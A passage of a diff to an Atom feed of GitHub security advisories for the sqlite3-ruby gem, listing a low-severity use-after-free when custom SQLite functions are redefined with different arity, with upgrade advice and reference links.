+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-j7fr-3v8c-3qc3">https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-j7fr-3v8c-3qc3</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/pull/711">https://github.com/sparklemotion/sqlite3-ruby/pull/711</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/commit/b24e1e6076528b7f95f99acf7a81c70d0004c726">https://github.com/sparklemotion/sqlite3-ruby/commit/b24e1e6076528b7f95f99acf7a81c70d0004c726</a></li>
+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54620.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54620.yml</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5">https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5</a></li>
+<li><a href="https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54620">https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54620</a></li>
+<li><a href="https://github.com/advisories/GHSA-j7fr-3v8c-3qc3">https://github.com/advisories/GHSA-j7fr-3v8c-3qc3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-j7fr-3v8c-3qc3</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-28T16:23:57.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[sqlite3] sqlite3-ruby has Use-After-Free When Redefining SQLite Functions with Different Arity]]></title>
+        <id>https://github.com/advisories/GHSA-28hh-pr2h-2w89</id>
+        <link href="https://github.com/advisories/GHSA-28hh-pr2h-2w89"/>
+        <updated>2026-07-28T16:21:33.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Using <code>Database#create_function</code> or <code>Database#define_function</code> to define the same function name more than once with different numbers of arguments ("arity") or text encodings will result in a invalid memory read and a segmentation fault.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>Upgrade to sqlite3 gem v2.9.5 or later.</p>
+<p>As a workaround, avoid defining multiple custom functions with the same name (varying numbers of arguments or encoding).</p>
+<h2 id="severity">Severity</h2>
+<p>The sqlite3-ruby maintainers assess this as Low severity. It is reliably triggered after GC when code is structured in a particular way. There is no known general exploit that could be used as a denial of service attack.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-28hh-pr2h-2w89">https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-28hh-pr2h-2w89</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/pull/710">https://github.com/sparklemotion/sqlite3-ruby/pull/710</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/commit/2bd436d17f77cdd4c31b00fe9d50b0d21cbaf033">https://github.com/sparklemotion/sqlite3-ruby/commit/2bd436d17f77cdd4c31b00fe9d50b0d21cbaf033</a></li>
+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54619.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54619.yml</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5">https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5</a></li>
+<li><a href="https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54619">https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54619</a></li>
+<li><a href="https://github.com/advisories/GHSA-28hh-pr2h-2w89">https://github.com/advisories/GHSA-28hh-pr2h-2w89</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-28hh-pr2h-2w89</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-28T16:21:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[sqlite3-ruby] sqlite3-ruby has Use-After-Free When Redefining SQLite Functions with Different Arity]]></title>
+        <id>https://github.com/advisories/GHSA-28hh-pr2h-2w89</id>
+        <link href="https://github.com/advisories/GHSA-28hh-pr2h-2w89"/>
+        <updated>2026-07-28T16:21:33.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Using <code>Database#create_function</code> or <code>Database#define_function</code> to define the same function name more than once with different numbers of arguments ("arity") or text encodings will result in a invalid memory read and a segmentation fault.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>Upgrade to sqlite3 gem v2.9.5 or later.</p>
+<p>As a workaround, avoid defining multiple custom functions with the same name (varying numbers of arguments or encoding).</p>
+<h2 id="severity">Severity</h2>
+<p>The sqlite3-ruby maintainers assess this as Low severity. It is reliably triggered after GC when code is structured in a particular way. There is no known general exploit that could be used as a denial of service attack.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-28hh-pr2h-2w89">https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-28hh-pr2h-2w89</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/pull/710">https://github.com/sparklemotion/sqlite3-ruby/pull/710</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/commit/2bd436d17f77cdd4c31b00fe9d50b0d21cbaf033">https://github.com/sparklemotion/sqlite3-ruby/commit/2bd436d17f77cdd4c31b00fe9d50b0d21cbaf033</a></li>
+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54619.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54619.yml</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5">https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5</a></li>
+<li><a href="https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54619">https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54619</a></li>
+<li><a href="https://github.com/advisories/GHSA-28hh-pr2h-2w89">https://github.com/advisories/GHSA-28hh-pr2h-2w89</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-28hh-pr2h-2w89</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-28T16:21:31.000Z</published>
+    </entry>
+</feed>
